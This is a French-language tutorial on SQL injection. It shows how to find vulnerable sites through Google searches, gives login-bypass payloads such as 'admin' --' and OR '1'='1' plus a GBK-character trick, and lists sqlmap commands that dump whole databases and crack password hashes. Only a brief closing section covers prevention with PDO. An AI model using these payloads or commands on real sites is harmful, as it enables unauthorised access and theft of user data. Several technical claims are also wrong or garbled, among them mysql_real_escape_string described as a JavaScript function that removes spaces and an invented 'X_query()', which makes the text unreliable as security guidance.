# Failles web - injection SQL

## Description
L'injection SQL est régulièrement le top du classement de l'OWASP et potentiellement très dangeureuse. En modifiant la requête SQL et en injectant des bouts de code non filtrés, un attaquant va pouvoir obtenir le plus souvent tout le contenu de la base de donnée du site.

## Détection
Il est possible de trouver des sites vulnérables à partir d'une requête Google : `.php?id=` qui va nous renvoyer les pages PHP qui prennent en paramètre un id. En allant sur ces pages et en ajoutant une quote `'` à la fin de l'URL, si une erreur est générée, la page est probablement vulnérable.

Un autre moyen est par exemple sur une URL `http://domain.com/index.php?id=1`. Il suffit de passer la requête `2 AND 1=1` qui renverra vrai. une fois encodée ça donne:

    http://domain.com/index.php?id=2+and+1%3D1
L'absence d'erreur est un signe de possible vulnérabilité puisque cela prouve que la requête a fonctionné.

## Intention
Une injection SQL peut aller du simple bypass de l'authentification d'une webapp, à la fuite d'informations, la corruptions d'information voir la prise totale du serveur.

## Exploitation
### Basique

Une authentification basique sans aucun filtre est généralement écrite comme ceci:

    SELECT * from admins WHERE login='$login' AND password='$password'
Il suffit alors de passer `admin' --` peu importe le mot de passe pour être loggé en admin. le `--` va commenter le reste de la requête. `#` est un équivalent de `--`.

Pour exploiter ce type de conditions, on passe `unLogin’ OR ‘1’=‘1` sans la quote à la fin puisqu'elle est présente dans le test PHP. En passant ce type de chaîne sur les variables user et pass, l'authentification sera toujours vraie.

L'authentification retourne les n-uplets et l'utilisateur est null d'où le therme NULL Authentification. Une protection est parfois utilisée pour compter le nombre de n-uplets:

    if (count(mysql_fetch_assoc($result)) == 1) echo « Vous êtes connecté ! » ;
Qui se contourne avec pour le champs password : `unPassword OR ‘1’=‘1’ LIMIT 1,1 -- ‘`

### La fonction JS `mysql_real_escape_string()`
La fonction JS `mysql_real_escape_string()` (qui supprime les espaces) a une vulnérabilité avec les caractères GBK représentant les caractères chinois. Si on passe un caractère GBK suivi d'une quote, la quote n'est pas supprimée. En passant donc une condition toujours vrai avec un caractère GBK, l'authentification passera. Il suffit dont de passer `乻' or 1=1` dans les champs user et pass.

### SQLmap
[SQLmap](http://sqlmap.org) est l'outil le plus connu et le plus complet pour l'exploitation d'injection SQL. Après le lancement de SQLmap puis:

Pour récupérer toutes les bases de données (yes pour passer les payloads et yes pour inclure les tests pour mysql):

    $ sqlmap -u http://cible/...php?=4 --dbs
infomation_schema : c'est une base de données std de tous les sgbd, elle n'a pas forcément d'intérêt

Récuépration d'une DB (avec guillemets si espace dans le nom) avec ses tables:

    $ sqlmap -u http://cible/...php?=4 -D "nom_database" --tables

Récupération d'une table (avec les colonnes):

    $ sqlmap -u http://cible/...php?=4 -D "nom_database" -T "nom_table" --columns

Récupération du contenu (yes pour enregistrer les hash pour utilisation future et oui pour attaquer les mdp, et non pour les suffixes)

    $ sqlmap -u http://cible/...php?=4 -D "nom_database" -T "nom_table" -C "col1","col2",... --dump

sqlmap va également proposer de cracker les résultats

## Prévention
Pour se prémunir il faut travailler sur les entrées utilisateurs et échapper les caractères spéciaux contenu :
* MySQL : `mysql_real_escape_string()`
* SQLite : `sqlite_escape_string()`
* PostgreSQL : `pg_escape_string()`

En PHP, des fonctions interdisent l'exécution de plus d'une requête :
* PHP : `X_query()`

Il est également possible en PHP d'utiliser les requêtes préparées via la couche PDO (PHP Data Object):

    <?php
        // Récupération des entrées utilisateur
        $login = $_POST['login'];
        $password = $_POST['password'];

        // Connexion à la BDD avec PDO
        try { $bdd = new PDO('mysql:host=localhost;dbname=bdd','root',''); }
        catch (Exeption $e) { die('Erreur : ' .$e->getMessage())  or die(print_r($bdd->errorInfo())); }

        // Requête SQL sécurisée
        $req = $bdd->prepare("SELECT * FROM utilisateurs WHERE login= ? AND password= ?");
        $req->execute(array($login, $password));
    ?>

## Liens
https://blog.clever-age.com/fr/2013/09/18/securite-owasp-injection-sql/
https://openclassrooms.com/fr/courses/2091901-protegez-vous-efficacement-contre-les-failles-web/2680180-linjection-sql